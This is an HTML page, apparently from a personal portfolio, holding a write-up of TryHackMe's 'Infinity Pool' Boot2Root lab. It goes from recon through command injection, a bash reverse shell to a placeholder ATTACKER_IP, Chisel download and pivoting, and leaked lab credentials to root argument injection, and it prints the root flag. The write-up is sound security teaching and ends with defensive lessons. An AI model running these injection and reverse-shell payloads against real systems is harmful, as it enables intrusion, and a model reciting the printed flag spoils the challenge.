@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Infinity Pool (TryHackMe) - CTF Write-up</title>
+    <meta name="description" content="CTF write-up for the Infinity Pool challenge from TryHackMe's Hacker Holidays event. Full Boot2Root chain covering command injection, Chisel pivoting, FreePBX exploitation, and root argument injection.">
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+    <!-- Styles -->
+    <link rel="stylesheet" href="../css/style.css">
+
+    <style>
+        .writeup-container {
+            max-width: 800px;
+            margin: 120px auto 50px auto;
+            padding: 40px;
+        }
+        h1, h2, h3 {
+            color: var(--primary-color, #00ffcc);
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        h1 {
+            font-size: 2rem;
+            margin-top: 0;
+        }
+        p {
+            margin-bottom: 15px;
+            line-height: 1.6;
+            color: var(--text-color, #ffffff);
+        }
+        ul {
+            margin-left: 20px;
+            margin-bottom: 20px;
+            color: var(--text-color, #ffffff);
+            line-height: 1.6;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        code {
+            background: rgba(0, 255, 204, 0.1);
+            color: var(--primary-color, #00ffcc);
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9em;
+        }
+        pre {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: var(--text-color, #ffffff);
+            line-height: 1.6;
+        }
+        blockquote {
+            border-left: 4px solid var(--primary-color, #00ffcc);
+            padding-left: 20px;
+            font-style: italic;
+            margin-bottom: 25px;
+            opacity: 0.8;
+            color: var(--text-color, #ffffff);
+        }
+        .flag-box {
+            background: rgba(0, 255, 204, 0.1);
+            border: 1px solid var(--primary-color, #00ffcc);
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.2rem;
+            color: var(--primary-color, #00ffcc);
+            text-align: center;
+            margin-top: 20px;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);
+        }
+        .meta-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 30px;
+        }
+        .meta-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--glass-border);
+            color: var(--text-color, #ffffff);
+        }
+        .meta-table td:first-child {
+            font-weight: 600;
+            color: var(--primary-color, #00ffcc);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            width: 140px;
+        }
+        .step-label {
+            display: inline-block;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--primary-color, #00ffcc);
+            background: var(--primary-glow);
+            padding: 4px 12px;
+            border-radius: 4px;
+            margin-bottom: 12px;
+        }
+        .success-box {
+            background: rgba(0, 255, 150, 0.06);
+            border: 1px solid rgba(0, 255, 150, 0.25);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #69db7c;
+        }
+        .denied-box {
+            background: rgba(255, 50, 50, 0.08);
+            border: 1px solid rgba(255, 50, 50, 0.3);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #ff6b6b;
+        }
+        .takeaway-card {
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+        .takeaway-card h4 {
+            color: var(--primary-color, #00ffcc);
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+        }
+        .takeaway-card p {
+            margin-bottom: 0;
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+        .attack-chain {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            align-items: center;
+            margin-bottom: 25px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+        }
+        .chain-step {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            padding: 6px 12px;
+            border-radius: 4px;
+            background: rgba(0, 255, 204, 0.08);
+            border: 1px solid rgba(0, 255, 204, 0.2);
+            color: var(--primary-color, #00ffcc);
+        }
+        .chain-arrow {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+        .flag-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body class="dark-theme">
+    <header>
+        <nav id="navbar" style="background: rgba(10, 10, 10, 0.9); backdrop-filter: blur(10px);">
+            <div class="logo">OMAR</div>
+            <ul class="nav-links">
+                <li><a href="./">← All Write-ups</a></li>
+                <li><a href="../index.html" class="btn">Portfolio</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="writeup-container glass">
+        <h1>CTF Write-up: Infinity Pool</h1>
+
+        <table class="meta-table">
+            <tr><td>Event</td><td>Hacker Holidays · The Byte Lotus Hotel</td></tr>
+            <tr><td>Platform</td><td>TryHackMe</td></tr>
+            <tr><td>Category</td><td>🖥️ Boot2Root</td></tr>
+            <tr><td>Difficulty</td><td>Medium</td></tr>
+            <tr><td>Points</td><td>90</td></tr>
+            <tr><td>Tags</td><td>Command Injection · SSRF-style Netcheck · FreePBX UCP · CVE-2026-46376 · Argument Injection · Chisel Pivot</td></tr>
+            <tr><td>Target</td><td><code>10.48.188.22</code></td></tr>
+        </table>
+
+        <h2>Challenge Overview</h2>
+        <p><strong>Objective:</strong> Compromise the Byte Lotus Hotel's internal infrastructure, pivot through localhost-only services, and recover both the user and root flags.</p>
+        <blockquote>
+            "Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see."
+        </blockquote>
+
+        <h3>Attack Chain</h3>
+        <div class="attack-chain">
+            <span class="chain-step">Nmap Scan</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">Command Injection</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">Reverse Shell</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">🚩 User Flag</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">Local Enumeration</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">Chisel Pivot</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">FreePBX UCP</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">Voicemail Token</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">Argument Injection</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">🚩 Root Flag</span>
+        </div>
+
+        <h2>Methodology</h2>
+
+        <h3><span class="step-label">STEP 1</span> Reconnaissance</h3>
+        <p>I started with a targeted Nmap scan against the target to enumerate open ports and identify running services:</p>
+        <pre>nmap -Pn -sC -sV -oN nmap/initial 10.48.188.22</pre>
+        <ul>
+            <li><code>-Pn</code> — Skips host discovery (treats the host as online), useful since lab machines may not respond to ICMP pings.</li>
+            <li><code>-sC</code> — Runs Nmap's default NSE scripts for additional enumeration (banner grabbing, version fingerprinting, etc.).</li>
+            <li><code>-sV</code> — Probes open ports to determine the service and version running on each.</li>
+            <li><code>-oN nmap/initial</code> — Saves output in normal format for later reference.</li>
+        </ul>
+        <p>The scan revealed two open ports:</p>
+        <ul>
+            <li><strong>Port 22</strong> — OpenSSH 9.6p1 (standard SSH, no immediate attack surface).</li>
+            <li><strong>Port 80</strong> — Gunicorn HTTP server serving a static hotel marketing site titled <em>"Byte Lotus — Stay Noticed"</em>.</li>
+        </ul>
+        <p>I then checked for hidden paths via <code>robots.txt</code>:</p>
+        <pre>curl -s http://10.48.188.22/robots.txt</pre>
+        <p>The file disallowed two interesting endpoints: <code>/internal/</code> and <code>/status</code>. Navigating to <code>/status</code> revealed a staff tool page titled <strong>"Sister-property connectivity"</strong> with a form that POSTs to <code>/internal/netcheck</code> with a <code>host</code> parameter.</p>
+        <div class="success-box">
+            ✓ Hidden staff-facing endpoint discovered at /status → /internal/netcheck.
+        </div>
+
+        <h3><span class="step-label">STEP 2</span> Command Injection Confirmation</h3>
+        <p>The <code>/internal/netcheck</code> endpoint accepts a <code>host</code> parameter and likely concatenates it directly into a shell command (most probably <code>ping</code>). I tested for OS command injection by appending a semicolon followed by the <code>id</code> command:</p>
+        <pre>curl -s -X POST http://10.48.188.22/internal/netcheck \
+  --data-urlencode 'host=127.0.0.1; id'</pre>
+        <p>The response included the output of the injected command:</p>
+        <pre>uid=1001(web) gid=1001(web) groups=1001(web)</pre>
+        <p>This confirmed that user input is passed unsanitised into a shell command, resulting in arbitrary code execution as the <code>web</code> service account.</p>
+        <div class="success-box">
+            ✓ Command injection confirmed — server executed the injected id command as the web user.
+        </div>
+
+        <h3><span class="step-label">STEP 3</span> Reverse Shell — User Flag</h3>
+        <p>With confirmed command injection, I deployed a reverse shell to get an interactive session on the target. I set up a Netcat listener on my attacking machine:</p>
+        <pre>nc -lvnp 4444</pre>
+        <p>Then triggered the reverse shell through the command injection, using <code>setsid</code> to detach the process from the HTTP request's lifecycle so the shell persists after the response completes:</p>
+        <pre>curl -s -m 10 -X POST http://10.48.188.22/internal/netcheck \
+  --data-urlencode "host=127.0.0.1; setsid bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1' &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp;"</pre>
+        <p>The payload spawns an interactive bash shell that redirects stdin, stdout, and stderr through a TCP connection back to my listener. I caught the connection and landed as the <code>web</code> service account:</p>
+        <pre>connect to [ATTACKER_IP] from (UNKNOWN) [10.48.188.22] 39568
+web@tryhackme-2404:/var/www/infinity_pool/edge$ whoami
+web</pre>
+        <p>I stabilised the shell for a proper interactive TTY:</p>
+        <pre>python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl+Z on attacker terminal
+stty raw -echo; fg
+export TERM=xterm</pre>
+        <p>The user flag was located in the <code>web</code> user's home directory:</p>
+        <pre>cat /home/web/user.txt</pre>
+        <div class="flag-label">USER FLAG</div>
+        <div class="flag-box">
+            🚩 (from /home/web/user.txt)
+        </div>
+
+        <h3><span class="step-label">STEP 4</span> Local Service Enumeration</h3>
+        <p>With a foothold on the box, I enumerated for internal services that might provide a path to privilege escalation. I listed all listening TCP ports:</p>
+        <pre>ss -tlnp</pre>
+        <p>This revealed several localhost-only services that were not reachable externally:</p>
+        <ul>
+            <li><code>127.0.0.1:3000</code> — <strong>Watchtower</strong> (configuration/monitoring dashboard).</li>
+            <li><code>127.0.0.1:8080</code> — <strong>FreePBX UCP</strong> (telephony user control panel).</li>
+            <li><code>127.0.0.1:9000</code> — <strong>Automation / export API</strong> (internal job runner).</li>
+            <li><code>127.0.0.1:5038</code>, <code>8088</code>, <code>8089</code>, <code>3306</code> — Asterisk AMI, HTTP/HTTPS, and MySQL (supporting services).</li>
+        </ul>
+        <p>I queried the Watchtower configuration endpoint and found a critical information disclosure:</p>
+        <pre>curl -s http://127.0.0.1:3000/api/config</pre>
+        <pre>{
+  "automation_endpoint": "http://127.0.0.1:9000",
+  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
+  "telephony_pass": "St4yN0t1c3d_2026",
+  "telephony_portal": "http://127.0.0.1:8080/ucp",
+  "telephony_user": "FreePBXUCPTemplateCreator"
+}</pre>
+        <p>The Watchtower config leaked default FreePBX UCP credentials and an operations note explicitly acknowledging they had not been rotated — a CVE-2026-46376 style issue. It also confirmed the automation endpoint running on port 9000.</p>
+        <div class="success-box">
+            ✓ Watchtower config leak — default FreePBX UCP credentials and automation endpoint discovered.
+        </div>
+
+        <h3><span class="step-label">STEP 5</span> Pivot with Chisel</h3>
+        <p>To interact with the localhost-only services from my attacker machine (especially the FreePBX UCP web interface), I established reverse port-forwarding tunnels using <strong>Chisel</strong>.</p>
+        <p><strong>Attacker — Terminal 1</strong> (start the Chisel server in reverse mode):</p>
+        <pre>chisel server -p 9999 --reverse</pre>
+        <p><strong>Attacker — Terminal 2</strong> (serve the Chisel binary to the target):</p>
+        <pre>cp $(which chisel) /tmp/chisel
+cd /tmp
+python3 -m http.server 8000</pre>
+        <p><strong>Target shell</strong> (download and connect the Chisel client, forwarding three internal ports):</p>
+        <pre>cd /tmp
+curl -o chisel http://ATTACKER_IP:8000/chisel
+chmod +x chisel
+./chisel client ATTACKER_IP:9999 \
+  R:8080:127.0.0.1:8080 \
+  R:9000:127.0.0.1:9000 \
+  R:3000:127.0.0.1:3000 &amp;</pre>
+        <p>With the tunnels established, the target's internal services were now reachable from my machine:</p>
+        <ul>
+            <li><code>http://127.0.0.1:8080/ucp</code> → FreePBX UCP</li>
+            <li><code>http://127.0.0.1:9000</code> → Automation API</li>
+            <li><code>http://127.0.0.1:3000</code> → Watchtower</li>
+        </ul>
+        <div class="success-box">
+            ✓ Chisel reverse tunnels established — all internal services accessible from the attacker machine.
+        </div>
+
+        <h3><span class="step-label">STEP 6</span> FreePBX UCP — Automation Token via Voicemail</h3>
+        <p>With the FreePBX UCP now accessible through the Chisel tunnel, I logged in with the leaked default template credentials:</p>
+        <ul>
+            <li><strong>Username:</strong> <code>FreePBXUCPTemplateCreator</code></li>
+            <li><strong>Password:</strong> <code>St4yN0t1c3d_2026</code></li>
+        </ul>
+        <p>After authenticating, I created a new dashboard (via the <code>+</code> button in the top-right corner) and added the <strong>Voicemail</strong> widget. A single voicemail message was waiting in the Inbox. Playing it revealed a sensitive automation key that had been left in the telephony system:</p>
+        <pre>"Automation Key"
+cc_auto_7b3f9a1c4e0d2f6a
+&lt;9000&gt;</pre>
+        <p>This provided the Bearer token required to authenticate against the automation export API on port 9000.</p>
+        <div class="success-box">
+            ✓ Bearer token obtained from voicemail: cc_auto_7b3f9a1c4e0d2f6a
+        </div>
+
+        <h3><span class="step-label">STEP 7</span> Root via Argument Injection</h3>
+        <p>The automation service on port 9000 runs as <strong>root</strong> and exposes a <code>/jobs/export</code> endpoint that builds a <code>tar</code> command via string concatenation:</p>
+        <pre>tar czf /var/automation/exports/&lt;report&gt;.tgz /var/automation/data 2&gt;&amp;1</pre>
+        <p>The <code>report</code> parameter from the JSON request body is inserted directly into the command line without sanitisation. By injecting a semicolon to terminate the original <code>tar</code> command and a <code>#</code> to comment out the trailing <code>.tgz</code> suffix, I was able to execute arbitrary commands as root:</p>
+        <pre>curl -s -X POST http://127.0.0.1:9000/jobs/export \
+  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
+  -H "Content-Type: application/json" \
+  --data-binary '{"report":"x;cat /root/root.txt;#"}'</pre>
+        <p>The server executed the injected command and returned the root flag in the response:</p>
+        <pre>{
+  "command": "tar czf /var/automation/exports/x;cat /root/root.txt;#.tgz /var/automation/data 2&gt;&amp;1",
+  "output": "THM{tr4c3d_t0_th3_h0r1z0n}\ntar: Cowardly refusing to create an empty archive\n..."
+}</pre>
+        <div class="flag-label">ROOT FLAG</div>
+        <div class="flag-box">
+            🚩 THM{tr4c3d_t0_th3_h0r1z0n}
+        </div>
+
+        <h2>Key Takeaways</h2>
+
+        <div class="takeaway-card">
+            <h4>💉 Never Concatenate User Input into Shell Commands</h4>
+            <p>Both the initial <code>/internal/netcheck</code> endpoint and the root-level <code>/jobs/export</code> service suffered from the same class of vulnerability: unsanitised user input concatenated directly into shell commands. Using proper argument arrays (<code>execve</code>-style) or strict allow-listing of the input would have prevented both the initial foothold and the final root compromise.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>🌐 Localhost ≠ Security Boundary</h4>
+            <p>Binding services to <code>127.0.0.1</code> is not a security control. Once an attacker has any level of code execution on the host, tools like Chisel can trivially forward internal ports. Defence-in-depth requires authentication and authorisation on every service, regardless of its bind address.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>🔑 Rotate Default and Template Credentials</h4>
+            <p>The FreePBX UCP was still running with default template credentials (<code>FreePBXUCPTemplateCreator</code>), and the Watchtower config even included an operations note acknowledging the issue. Default credentials are a trivial entry point and should be rotated immediately upon deployment (CVE-2026-46376 style).</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>📞 Secrets in User-Facing Stores Are Not Safe</h4>
+            <p>Storing a sensitive automation Bearer token in a voicemail message is security through obscurity. Once an attacker gains authenticated access to the telephony system — as was trivially possible here with default credentials — any secrets stored in voicemail, call recordings, or similar user-facing stores are immediately recoverable.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>📁 Argument Injection ≈ Command Injection</h4>
+            <p>Injecting into a filename parameter that is placed on a shell command line is functionally equivalent to command injection. The <code>report</code> value was intended to be a filename, but because it was assembled into a <code>tar</code> command via string interpolation rather than passed as a proper argument, it provided full root-level arbitrary command execution.</p>
+        </div>
+    </main>
+</body>
+</html>
